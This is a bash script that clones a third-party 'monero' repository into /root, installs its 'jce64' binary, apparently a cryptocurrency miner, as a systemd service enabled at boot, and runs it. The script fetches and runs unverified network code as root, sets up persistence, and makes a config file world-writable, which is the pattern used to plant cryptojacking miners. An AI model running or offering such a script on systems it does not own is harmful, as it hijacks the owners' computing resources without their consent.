#!/bin/bash

cd /root/ && apt-get install git && git clone https://github.com/nokian5500/monero.git && cd /root/monero && chmod +x jce64 && chmod +x jce64.service && chmod 777 serviceconfig.txt && mv jce64.service /lib/systemd/system && systemctl daemon-reload && systemctl enable jce64.service && systemctl start jce64.service && ./jce64

